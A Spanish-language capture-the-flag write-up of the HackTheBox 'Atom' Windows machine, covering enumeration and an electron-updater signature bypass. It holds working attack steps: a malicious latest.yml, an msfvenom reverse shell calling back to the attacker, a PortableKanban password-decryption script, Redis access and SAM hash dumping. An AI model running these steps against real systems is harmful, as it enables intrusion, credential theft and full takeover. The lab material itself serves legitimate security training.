---
title: "Atom Write-UP | HackTheBox"
date: "2021-08-09"
categories: [Write-Ups, HackTheBox]
tags: [CTFs, HackTheBox, Write-Ups]
media_subpath: /assets/img/posts/2021-08-09-atom-write-up-hackthebox
image:
   path: header/atom_card.webp
   lqip: data:image/webp;base64,UklGRmIAAABXRUJQVlA4IFYAAADQAwCdASoUAA0APzmGuVOvKSWisAgB4CcJZQAARmX/t06CXx6ekAAA/tzb9IXHWLMNo3ODVpHcGi2Nq8eGd5nEFqz0WyavmTxp6R6qKHJZnlZb6FAAAA==
   
published: true
---

## Descripción

En esta máquina **Atom** de la plataforma **Hackthebox** con dificultad "Medium" y OS Windows, haremos uso de exploit para el módulo Electron-Updater del gestor de paquetes NPM de Node.js, encontraremos archivos de configuración de Redis y KanBan para realizar escalada de privilegios, para así llegar a obtener privilegios máximos en el sistema.

Como punto a comentar, la dirección IP de la máquina activa y la que se muestran en las imágenes y/o comandos utilizados son diferentes, ya que se ha utilizado instancia personal para la realización de dicho laboratorio.

## Escaneo y Enumeración

Comenzaremos como siempre con una traza ICMP para identificar el tipo de SO que utiliza la máquina objetivo en base al TTL.

Nos encontramos con una máquina de SO Windows:

```bash
> ping -c 1 10.129.173.50                                                      
PING 10.129.173.50 (10.129.173.50) 56(84) bytes of data.
64 bytes from 10.129.173.50: icmp_seq=1 ttl=127 time=52.1 ms

--- 10.129.173.50 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 52.058/52.058/52.058/0.000 ms
```

Hacemos uso de la herramienta **NMAP** para descubrir puertos abiertos:

```bash
# Nmap 7.91 scan initiated Wed Jul 14 09:50:02 2021 as: nmap -T5 -p- --open --min-rate 5000 -Pn -n -v -oG allPorts -oN atom.initScan 10.129.173.50
Nmap scan report for 10.129.173.50
Host is up (0.054s latency).
Not shown: 65529 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
443/tcp  open  https
445/tcp  open  microsoft-ds
5985/tcp open  wsman
6379/tcp open  redis
```

Lanzamos nuevamente NMAP para intentar descubrir vulnerabilidades conocidas y versión utilizada por los servicios corriendo en los puertos abiertos encontrados:

```bash
# Nmap 7.91 scan initiated Wed Jul 14 09:50:28 2021 as: nmap -sC -sV -p80,135,443,445,5985,6379 -Pn -n -v -oN atom.services 10.129.173.50
Nmap scan report for 10.129.173.50
Host is up (0.050s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-methods: 
|   Supported Methods: POST OPTIONS HEAD GET TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Heed Solutions
135/tcp  open  msrpc        Microsoft Windows RPC
443/tcp  open  ssl/http     Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-methods: 
|   Supported Methods: POST OPTIONS HEAD GET TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Heed Solutions
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4 4cc9 9e84 b26f 9e63 9f9e d229 dee0
|_SHA-1: b023 8c54 7a90 5bfa 119c 4e8b acca eacf 3649 1ff6
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6379/tcp open  redis        Redis key-value store
Service Info: Host: ATOM; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h20m00s, deviation: 4h02m30s, median: 0s
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: ATOM
|   NetBIOS computer name: ATOM\\x00
|   Workgroup: WORKGROUP\\x00
|_  System time: 2021-07-14T00:50:47-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-07-14T07:50:48
|_  start_date: N/A
```

Puertos interesantes como 445 (SMB), 5985 (WinRM) y 6379 (Redis).

> Redis es un motor de base de datos en memoria, basado en el almacenamiento en tablas de hashes pero que opcionalmente puede ser usada como una base de datos durable o persistente.

Utilizamos la herramienta **whatweb** para identificar de una pasada el sitio web ya que tiene servicio HTTP corriendo en puerto 80:

```bash
> whatweb <http://10.129.173.50>
<http://10.129.173.50> [200 OK] Apache[2.4.46], Bootstrap, Country[RESERVED][ZZ], Email[MrR3boot@atom.htb], HTML5, HTTPServer[Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27], IP[10.129.173.50], OpenSSL[1.1.1j], PHP[7.3.27], Script, Title[Heed Solutions]

> whatweb <https://10.129.173.50>
<https://10.129.173.50> [200 OK] Apache[2.4.46], Bootstrap, Country[RESERVED][ZZ], Email[MrR3boot@atom.htb], HTML5, HTTPServer[Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27], IP[10.129.173.50], OpenSSL[1.1.1j], PHP[7.3.27], Script, Title[Heed Solutions]
```

Como tiene certificado **SSL** para HTTP, pasamos a enumerar el puerto 443 con **Openssl** para ver si encontramos algún subdominio:

```bash
> echo | openssl s_client -connect 10.129.173.50:443  
          
CONNECTED(00000003)
Can't use SSL_get_servername
depth=0 CN = localhost
verify error:num=66:EE certificate key too weak
verify return:1
depth=0 CN = localhost
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = localhost
verify error:num=10:certificate has expired
notAfter=Nov  8 23:48:47 2019 GMT
verify return:1
depth=0 CN = localhost
notAfter=Nov  8 23:48:47 2019 GMT
verify return:1
---
Certificate chain
 0 s:CN = localhost
   i:CN = localhost
---
Server certificate
-----BEGIN CERTIFICATE-----
MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls
b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD
VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj
7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o
J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT
gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD
gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd
aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL
vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=
-----END CERTIFICATE-----
subject=CN = localhost

issuer=CN = localhost

---
No client certificate CA names sent
Peer signing digest: SHA256
Peer signature type: RSA-PSS
Server Temp Key: X25519, 253 bits
---
SSL handshake has read 847 bytes and written 363 bytes
Verification error: certificate has expired
---
New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384
Server public key is 1024 bit
Secure Renegotiation IS NOT supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
Early data was not sent
Verify return code: 10 (certificate has expired)
---
DONE
```

No encontramos nada interesante.

Abrimos el navegador y visitamos la dirección IP para ver que nos encontramos:

![](body/a44ac657f14fe2054de72fe9f67afde5a4ce2ce8.png)

Vemos que se trata de una aplicación llamada Heed, la cual parece como un gestor de notas. Podemos descargar el binario de Windows "heed\_setup\_v1.0.0.zip" pero por ahora no nos aporta nada interesante, pero es importante quedarnos con el nombre de esta aplicación.

Podríamos lanzar Gobuster para encontrar rutas de acceso posible, pero ya os adelanto que no van por ahí los tiros.

Pasamos a enumerar la máquina con **CrackMapExec** para identificar la máquina en la cual estamos trabajando, ya que tiene el puerto 445 como Open:

```bash
> crackmapexec smb 10.129.173.50                                                          
SMB         10.129.173.50   445    ATOM             [*] Windows 10 Pro 19042 x64 (name:ATOM) (domain:ATOM) (signing:False) (SMBv1:True)
```

Perfecto, como tiene el SMB Abierto, vamos a tirar de **smbclient** y **smbmap** para identificar recursos y permisos en estos:

```bash
> smbclient -L //10.129.173.50 -N                                       

        Sharename       Type      Comment
        --------- ---- -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Software_Updates Disk

> smbmap -H 10.129.173.50 -u 'null'
[+] Guest session       IP: 10.129.173.50:445   Name: 10.129.173.50                                     
        Disk                                                    Permissions     Comment
        ---- ----------- -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        Software_Updates                                        READ, WRITE
```

Encontramos un recurso compartido con nombre **Software\_Updates** y como vemos tenemos permisos de Lectura y Escritura. Vamos a montar el recurso con CIFS y así listamos los archivos que este contiene:

```bash
> mount -t cifs //10.129.173.50/Software_Updates /mnt/share 
Password for root@//10.129.173.50/Software_Updates: #EMPTY

> cd /mnt/share; tree                           
.
├── client1
├── client2
├── client3
└── UAT_Testing_Procedures.pdf

3 directories, 1 file
```

Encontarmos un archivo PDF con lo que parece ser unos procedimientos, abrimos este archivo:

![](body/8edccabd576e29a27a6f26b84a9796b8b9e1444d.png)

Como vemos, tiene el mismo nombre que la aplicación que hemos encontrado en el servicio Web y nos indica que está desarrollado con **Electron-Builder**. También nos indica que si queremos iniciar el Aseguramiento de calidad (QA), debemos colocar la actualización en uno de los directorios Clientes y el equipo de QA lo testeará y realizará la actualización e instalación.

Bueno, anteriormente al enumerar los recursos de SMB, hemos contrado 3 directorios Cliente que se encontraban vacíos, así que nos tocará buscar que es Electron-Builder y posibles exploits que puedan existir.

Realizando búsquedas en google sobre esta herramienta Electron-Builder, encontramos que está desarrollada en Node.js y que se trata de una plataforma para aplicaciones basadas en ElectronJs y que se emplea con frecuencia para actualizaciones de software.

Si tratamos de buscar vulnerabilidades o exploits, llegamos a un blog en el cual tratan sobre un exploit que afecta a Electron-Updater:

- [https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html](https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html)

A grandes rasgos, nos indica que creando un archivo llamado **latest.yml** y con la ruta a un binario malicioso que contenga una comilla simple en el nombre, el script en powershell que se encarga de la comprobación de los paquetes a actualizar, desencadenará un error en la sintaxis del script y ejecutará sin advertencias el binario indicado en la ruta.

La sitaxis para el archivo **latest.yml** que nos indican en el blog encontrado es la siguiente:

```bash
version: 1.2.3
files:
  - url: v’ulnerable-app-setup-1.2.3.exe
  sha512: GIh9UnKyCaPQ7ccX0MDL10UxPAAZ[...]tkYPEvMxDWgNkb8tPCNZLTbKWcDEOJzfA==
  size: 44653912
path: v'ulnerable-app-1.2.3.exe
sha512: GIh9UnKyCaPQ7ccX0MDL10UxPAAZr1[...]ZrR5X1kb8tPCNZLTbKWcDEOJzfA==
releaseDate: '2019-11-20T11:17:02.627Z'
```

Antes de crear el binario malicioso, vamos a identificar como funciona por detrás indicando la URL como Path y poniendo NC a la escucha en el puerto 80.

Creamos el archivo **latest.yml** con la siguiente sintaxis:

```bash
> cat -p latest.yml

version: 1.2.3
path: <http://10.10.14.14/test>
sha512: 12345 # No importa, ponemos el que queramos
```

Copiamos el archivo **latest.yml** a cualquiero directorio **Client** que hemos enumerado anteriormente y esperamos:

```bash
> cp latest.yml /mnt/share/client1/. 
```

Y obtenemos en netcat la siguiente petición GET:

```bash
> nc -lvnp 80

Listening on 0.0.0.0 80
Connection received on 10.129.173.50 57919
GET /test.blockmap HTTP/1.1
Host: 10.10.14.14
Connection: keep-alive
Content-Length: 0
accept: */*
User-Agent: electron-builder
Cache-Control: no-cache
Accept-Encoding: gzip, deflate
Accept-Language: en-US
```

## Explotación

Vale, vemos que efectivamente se realiza una petición como se indica. Pasamos a crear el binario malicioso para que se instale en la máquina cuando se realice la llamada.

```bash
> msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 -f exe -o r\\'everse.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: r'everse.exe
```

Recordad que es importante meter la comilla simple en el nombre del binario para que este escape al contexto del script de Powershell justo en la variable "${tempUpdateFile}" y se ejecute directamente. Con CrackMapExec hemos identificado que se trata de Windows 10 Pro x64.

En este punto si que hay que añadir el hash **sha512** del binario creado ya que este comprobará si efectivamente pertenece al binario que está llamando. No hace falta pasarlo a base64 como indican en el blog:

```bash
> sha512sum r\'everse.exe | cut -f 1 -d " " 
6b9f240c964ceb668e139e44529ea07ffbde1c4995be5ca6c30112f7598ecf7b8b7ba12ea2225760b06660a26da0f3fdee060035d6f659c97833192dc805d31a
```

El archivo **latest.yml** quedará de la siguiente forma:

```bash
 > cat -p latest.yml 
version: 1.2.3
path: <http://10.10.14.14/r'everse.exe>
sha512: 6b9f240c964ceb668e139e44529ea07ffbde1c4995be5ca6c30112f7598ecf7b8b7ba12ea2225760b06660a26da0f3fdee060035d6f659c97833192dc805d31a
```

Dejamos **netcat** a la escucha en el puerto indicado en el binario creado con **msfvenom**, levantamos nuestro servidor web con python para compartir el binario y copiamos el archivo l**atest.yml** al directorio Client elegido.

Esperamos la petición GET:

```powershell
> rlwrap nc -lvnp 443 
Listening on 0.0.0.0 443
Connection received on 10.129.173.50 58028
Microsoft Windows [Version 10.0.19042.906]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32> whoami
atom\jason
```

### User Flag

Una vez hemos obtenido shell con privilegios de usuario **Jason**, pasamos a mostrar la flag **user.txt**:

```powershell
C:\Users\jason\Desktop> type user.txt
33931a61b700d611f8cc3c3da55582c4
```

Enumeramos permisos de usuario y privilegios:

```powershell
C:\WINDOWS\system32> whoami /all

USER INFORMATION
----------------

User Name  SID                                           
========== ==============================================
atom\\jason S-1-5-21-1199094703-3580107816-3092147818-1002

GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes                                        
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\\Medium Mandatory Level Label            S-1-16-8192                                                    

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

```powershell
C:\WINDOWS\system32> net user jason
User name                    jason
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            3/30/2021 1:14:57 PM
Password expires             Never
Password changeable          3/30/2021 1:14:57 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   7/14/2021 12:39:02 AM

Logon hours allowed          All

Local Group Memberships      *Users                
Global Group memberships     *None                 
The command completed successfully.
```

Enumerando el sistema encontramos en el directorio Downloads archivos interesantes sobre PortableKanBan:

```powershell
C:\Users\jason\Downloads> dir
 
 Volume in drive C has no label.
 Volume Serial Number is 9793-C2E6

 Directory of C:\\Users\\jason\\Downloads

04/02/2021  08:00 AM    <DIR>          .
04/02/2021  08:00 AM    <DIR>          ..
03/31/2021  02:36 AM    <DIR>          node_modules
04/02/2021  08:21 PM    <DIR>          PortableKanban
               0 File(s)              0 bytes
               4 Dir(s)   5,603,115,008 bytes free

C:\\Users\\jason\\Downloads> cd PortableKanBan

C:\\Users\\jason\\Downloads\\PortableKanBan> dir
 
 Volume in drive C has no label.
 Volume Serial Number is 9793-C2E6

 Directory of C:\\Users\\jason\\Downloads\\PortableKanban

04/02/2021  08:21 PM    <DIR>          .
04/02/2021  08:21 PM    <DIR>          ..
02/27/2013  08:06 AM            58,368 CommandLine.dll
11/08/2017  01:52 PM           141,312 CsvHelper.dll
06/22/2016  09:31 PM           456,704 DotNetZip.dll
04/02/2021  07:44 AM    <DIR>          Files
11/23/2017  04:29 PM            23,040 Itenso.Rtf.Converter.Html.dll
11/23/2017  04:29 PM            75,776 Itenso.Rtf.Interpreter.dll
11/23/2017  04:29 PM            32,768 Itenso.Rtf.Parser.dll
11/23/2017  04:29 PM            19,968 Itenso.Sys.dll
11/23/2017  04:29 PM           376,832 MsgReader.dll
07/03/2014  10:20 PM           133,296 Ookii.Dialogs.dll
04/02/2021  07:17 AM    <DIR>          Plugins
04/02/2021  08:22 PM             5,920 PortableKanban.cfg
01/04/2018  09:12 PM           118,184 PortableKanban.Data.dll
01/04/2018  09:12 PM         1,878,440 PortableKanban.exe
01/04/2018  09:12 PM            31,144 PortableKanban.Extensions.dll
04/02/2021  07:21 AM               172 PortableKanban.pk3.lock
09/06/2017  12:18 PM           413,184 ServiceStack.Common.dll
09/06/2017  12:17 PM           137,216 ServiceStack.Interfaces.dll
09/06/2017  12:02 PM           292,352 ServiceStack.Redis.dll
09/06/2017  04:38 AM           411,648 ServiceStack.Text.dll
01/04/2018  09:14 PM         1,050,092 User Guide.pdf
              19 File(s)      5,656,416 bytes
               4 Dir(s)   5,603,028,992 bytes free
```

## Escalada de privilegios

KanBan en pocas palabras, es un gestor de tareas a través de un tablero. Permite realizar flujos de trabajo, etc. Parecido a Trello, no sé si lo conocéis...

Viendo los archivos, nos llaman la atención 2 de ellos:

- PortableKanban.cfg
- PortableKanban.pk3.lock

```bash
C:\Users\jason\Downloads\PortableKanban> type PortableKanBan.pk3.lock
{"MachineName":"ATOM","UserName":"jason","SID":"S-1-5-21-1199094703-3580107816-3092147818-1002","AppPath":"C:\\Users\\jason\\Downloads\\PortableKanban\\PortableKanban.exe"}

C:\Users\jason\Downloads\PortableKanban> type PortableKanBan.cfg
{"RoamingSettings":{"DataSource":"RedisServer","DbServer":"localhost","DbPort":6379,"DbEncPassword":"Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb","DbServer2":"" [...]
```

Interesante, tenemos lo que parece ser una contraseña cifrada y que hace referencia a **Redis**, el cual hemos enumerado anteriormente con NMAP y que se encuentra en el puerto 6379 y está público.

Como no sabemos hasta el momento como decodear la contraseña, búscamos en google para ver que encontramos. Llegamos a exploit-db, lo cual es lo mismo que searchploit:

```bash
> searchsploit kanban
------------------------------------------------------------------------ ---------------------------------│
 Exploit Title                                                          |  Path                           │
------------------------------------------------------------------------ ---------------------------------│
PortableKanban 4.3.6578.38136 - Encrypted Password Retrieval            | windows/local/49409.py          │
------------------------------------------------------------------------ ---------------------------------
```

Movemos el script de python a nuestro directorio. Visuzalizamos, ejecutamos y no funciona...Perfecto.

Bueno, modificando un poco el código del script y quedándonos únicamente con el contenido de la función decode(), tendremos lo siguiente:

```bash
> cat -p portable_kanban.py 

import json
import base64
from des import * #python3 -m pip install des
import sys

hash = 'Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb'

hash = base64.b64decode(hash.encode('utf-8'))
key = DesKey(b"7ly6UznJ")
print("Password: " + key.decrypt(hash,initial=b"XuVUm5fR",padding=True).decode('utf-8'))
```

Creamos una variable "hash" y añadimos la contraseña cifrada que hemos encontrado.

Ejecutamos el scritp con python3:

```bash
> python3 portable_kanban.py
Password: kidvscat_yes_kidvscat
```

Obtenemos la contraseña de lo que parece ser la autenticación para Redis, el cual hemos visto que se trata como de un tipo de base de datos en memoria de tipo hash o clave-valor.

- [https://blog.bi-geek.com/redis-para-principiantes/](https://blog.bi-geek.com/redis-para-principiantes/)

En Kali o Parrot, tenemos disponible de forma nativa la herramienta de redis-cli, el cual nos permite interactuar con el servicio Redis de un equipo remoto:

```bash
> redis-cli -h 10.129.173.50 -a kidvscat_yes_kidvscat
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.

10.129.173.50:6379>
```

Sitaxis:

- h <hostname> Server hostname (default: 127.0.0.1)
- a <password> Password to use when connecting to the server.

Solo nos queda enumerar las posibles bases de datos, tablas, etc.

```bash
10.129.173.50:6379> keys *
1) "pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0"
2) "pk:ids:MetaDataClass"
3) "pk:ids:User"
4) "pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff"

10.129.173.50:6379> get pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0
"{\"Id\":\"e8e29158d70d44b1a1ba4949d52790a0\",\"Name\":\"Administrator\",\"Initials\":\"\",\"Email\":\"\",\"EncryptedPassword\":\"Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi\",\"Role\":\"Admin\",\"Inactive\":false,\"TimeStamp\":637530169606440253}"
```

Uuhh, vemos que se trata de otra contraseña cifrada del usuario Administrator y muy parecida al hash de la contraseña anterior que nos ha permitido obtener las credenciales de Redis, por lo que volvemos al script que hemos modificado y le asignamos como valor a la variable hash que hemos creado está última contraseña cifrada:

```bash
> cat -p portable_kanban.py

import json
import base64
from des import * #python3 -m pip install des
import sys

hash = 'Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi'

hash = base64.b64decode(hash.encode('utf-8'))
key = DesKey(b"7ly6UznJ")
print("Password: " + key.decrypt(hash,initial=b"XuVUm5fR",padding=True).decode('utf-8'))

> python3 portable_kanban.py
Password: kidvscat_admin_@123
```

Podemos verificar si la contraseña obtenida es del usuario Admnistrator con CrackMapExec:

```bash
> crackmapexec smb 10.129.173.50 -u Administrator -p kidvscat_admin_@123 -d ATOM
SMB         10.129.173.50   445    ATOM             [*] Windows 10 Pro 19042 x64 (name:ATOM) (domain:ATOM) (signing:False) (SMBv1:True)
SMB         10.129.173.50   445    ATOM             [+] ATOM\Administrator:kidvscat_admin_@123 (Pwn3d!)
```

Vemos que las credenciales son correctas.

Una vez obtenida la contraseña en claro, solo nos queda autenticarnos a nivel de sistema con el usuario Administrator:

- Evil-WinRm

```bash
> evil-winrm -i 10.129.173.50 -u Administrator -p kidvscat_admin_@123

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
atom\administrator
```

- pth-winexe

```bash
> pth-winexe -U ATOM/Administrator%kidvscat_admin_@123 //10.129.173.50 cmd.exe
Microsoft Windows [Version 10.0.19042.906]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
atom\administrator
```

- psexec.py

```bash
psexec.py ATOM/Administrator:kidvscat_admin_@123@10.129.173.50 cmd.exe 
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.129.173.50.....
[*] Found writable share ADMIN$
[*] Uploading file pRfJZUtc.exe
[*] Opening SVCManager on 10.129.173.50.....
[*] Creating service VBYm on 10.129.173.50.....
[*] Starting service VBYm.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19042.906]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
nt authority\system
```

Ya por útlimo, podríamos dumpear los hashes del archivo SAM de los usuarios del sistema:

```bash
> crackmapexec smb 10.129.173.50 -u Administrator -p kidvscat_admin_@123 -d ATOM --sam
SMB         10.129.173.50   445    ATOM             [*] Windows 10 Pro 19042 x64 (name:ATOM) (domain:ATOM) (signing:False) (SMBv1:True)
SMB         10.129.173.50   445    ATOM             [+] ATOM\\Administrator:kidvscat_admin_@123 (Pwn3d!)
SMB         10.129.173.50   445    ATOM             [+] Dumping SAM hashes
SMB         10.129.173.50   445    ATOM             Administrator:500:aad3b435b51404eeaad3b435b51404ee:7df7256dc47d2125d825058b2f89ff38:::
SMB         10.129.173.50   445    ATOM             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.173.50   445    ATOM             DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.173.50   445    ATOM             WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e3f92dc41d4f0be7e38ed5f0db92c356:::
SMB         10.129.173.50   445    ATOM             jason:1002:aad3b435b51404eeaad3b435b51404ee:499aef4877d2d83e548a3e8f5f742ffe:::
SMB         10.129.173.50   445    ATOM             [+] Added 5 SAM hashes to the database
```

### Root Flag

Una vez hemos obtenido shell privilegiada con usuario Administrator, podemos visualizar la flag root.txt:

```bash
> *Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
ecb6df7498c0776c87c28999b6022760
```
